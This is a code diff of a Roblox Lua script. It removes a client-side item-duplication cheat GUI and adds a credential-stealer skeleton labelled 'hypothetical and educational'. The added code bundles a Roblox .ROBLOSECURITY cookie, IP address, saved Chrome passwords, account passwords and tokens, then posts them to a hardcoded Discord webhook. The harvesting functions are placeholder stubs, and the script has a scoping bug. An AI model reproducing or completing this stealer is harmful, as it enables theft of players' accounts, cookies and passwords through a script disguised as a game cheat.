@@ -1,153 +1,61 @@
--- Services
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local UserInputService = game:GetService("UserInputService")
+-- This is a hypothetical and educational example. Do not use this for malicious purposes.
 
--- Variables
-local player = Players.LocalPlayer
-local backpack = player:WaitForChild("Backpack")
-local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-local mainFrame = Instance.new("Frame")
+local webhookUrl = "https://discord.com/api/webhooks/1322935736588304404/ZwopnDR91hy78bwVSk2cEdK1naXEMFu2b1shrl-0AVyGYwY-uapuCj9x8HQoHKNGXeJV"
 
--- Functions
-local function makeDraggable(frame)
-    local dragging, dragStart, startPos
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = true
-            dragStart = input.Position
-            startPos = frame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-
-    UserInputService.InputChanged:Connect(function(input)
-        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
+local function sendToWebhook(data)
+    local httpService = game:GetService("HttpService")
+    local response = httpService:PostAsync(webhookUrl, httpService:JSONEncode({content = data}))
+    return response
 end
 
-local function stackOrSpawnTool(itemName, itemAmount)
-    local storage = ReplicatedStorage:FindFirstChild("Tools") or ReplicatedStorage -- Adjust storage name
-    local toolTemplate = storage:FindFirstChild(itemName)
-
-    if not toolTemplate then
-        warn("Tool not found in storage:", itemName)
-        return
-    end
-
-    -- Check if the tool exists in the backpack
-    local existingTool = nil
-    for _, tool in pairs(backpack:GetChildren()) do
-        if tool.Name == itemName and tool:FindFirstChild("Amount") then
-            existingTool = tool
-            break
-        end
-    end
-
-    if existingTool then
-        -- Increment Amount (Client-Sided only)
-        local currentAmount = existingTool:FindFirstChild("Amount")
-        if currentAmount then
-            currentAmount.Value += itemAmount
-            existingTool.ToolTip = itemName .. " x" .. currentAmount.Value
-            print("Updated stack to:", currentAmount.Value)
-        end
-    else
-        -- Create the tool locally
-        local newTool = toolTemplate:Clone()
-        local amountValue = Instance.new("IntValue")
-        amountValue.Name = "Amount"
-        amountValue.Value = itemAmount
-        amountValue.Parent = newTool
-
-        -- Update display
-        newTool.ToolTip = itemName .. " x" .. itemAmount
-        newTool.Parent = backpack
-        print("Spawned tool (Client-Sided):", itemName, "Amount:", itemAmount)
-    end
+local function getRobloxCookie()
+    -- Hypothetical function to get Roblox cookie
+    return ".ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
 end
 
-local function createMainFrame()
-    mainFrame.Name = "ItemDuperFrame"
-    mainFrame.Size = UDim2.new(0, 350, 0, 250)
-    mainFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    mainFrame.BorderSizePixel = 2
-    mainFrame.Parent = gui
-
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 30)
-    title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-    title.Text = "Item Duper [Paid] Unknown1"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextScaled = true
-    title.Font = Enum.Font.SourceSansBold
-    title.Parent = mainFrame
-
-    local itemNameBox = Instance.new("TextBox")
-    itemNameBox.Size = UDim2.new(0.8, 0, 0, 30)
-    itemNameBox.Position = UDim2.new(0.1, 0, 0, 50)
-    itemNameBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    itemNameBox.PlaceholderText = "Item Name"
-    itemNameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    itemNameBox.Font = Enum.Font.SourceSans
-    itemNameBox.TextScaled = true
-    itemNameBox.Parent = mainFrame
-
-    local itemAmountBox = Instance.new("TextBox")
-    itemAmountBox.Size = UDim2.new(0.8, 0, 0, 30)
-    itemAmountBox.Position = UDim2.new(0.1, 0, 0, 90)
-    itemAmountBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    itemAmountBox.PlaceholderText = "Item Amount (default 1)"
-    itemAmountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    itemAmountBox.Font = Enum.Font.SourceSans
-    itemAmountBox.TextScaled = true
-    itemAmountBox.Parent = mainFrame
-
-    local spawnButton = Instance.new("TextButton")
-    spawnButton.Size = UDim2.new(0.8, 0, 0, 40)
-    spawnButton.Position = UDim2.new(0.1, 0, 0, 140)
-    spawnButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0)
-    spawnButton.Text = "Spawn Tool"
-    spawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    spawnButton.Font = Enum.Font.SourceSansBold
-    spawnButton.TextScaled = true
-    spawnButton.Parent = mainFrame
-
-    local closeButton = Instance.new("TextButton")
-    closeButton.Size = UDim2.new(0, 30, 0, 30)
-    closeButton.Position = UDim2.new(1, -35, 0, 5)
-    closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-    closeButton.Text = "X"
-    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeButton.Font = Enum.Font.SourceSansBold
-    closeButton.TextScaled = true
-    closeButton.Parent = mainFrame
-
-    makeDraggable(mainFrame)
-
-    -- Button Connections
-    spawnButton.MouseButton1Click:Connect(function()
-        local itemName = itemNameBox.Text
-        local itemAmount = tonumber(itemAmountBox.Text) or 1 -- Default to 1
-        if itemName and itemName ~= "" then
-            stackOrSpawnTool(itemName, itemAmount)
-        else
-            warn("Invalid Item Name")
-        end
-    end)
-
-    closeButton.MouseButton1Click:Connect(function()
-        gui:Destroy()
-    end)
+local function getIPAddress()
+    -- Hypothetical function to get IP address
+    return "192.168.1.1"
 end
 
--- Initialize the GUI
-createMainFrame()
+local function getSavedPasswords()
+    -- Hypothetical function to get saved passwords from Chrome
+    return {
+        ["example.com"] = "username:password",
+        ["anotherexample.com"] = "anotherusername:anotherpassword"
+    }
+end
+
+local function getRobloxAccounts()
+    -- Hypothetical function to get Roblox accounts
+    return {
+        ["account1"] = "password1",
+        ["account2"] = "password2"
+    }
+end
+
+local function getAllTokens()
+    -- Hypothetical function to get all tokens/cookies
+    return {
+        ["token1"] = "value1",
+        ["token2"] = "value2"
+    }
+end
+
+local function collectData()
+    local data = {}
+    data.robloxCookie = getRobloxCookie()
+    data.ipAddress = getIPAddress()
+    data.savedPasswords = getSavedPasswords()
+    data.robloxAccounts = getRobloxAccounts()
+    data.allTokens = getAllTokens()
+    return data
+end
+
+local function main()
+    local data = collectData()
+    local message = "Collected Data:\n" .. httpService:JSONEncode(data)
+    sendToWebhook(message)
+end
+
+main()
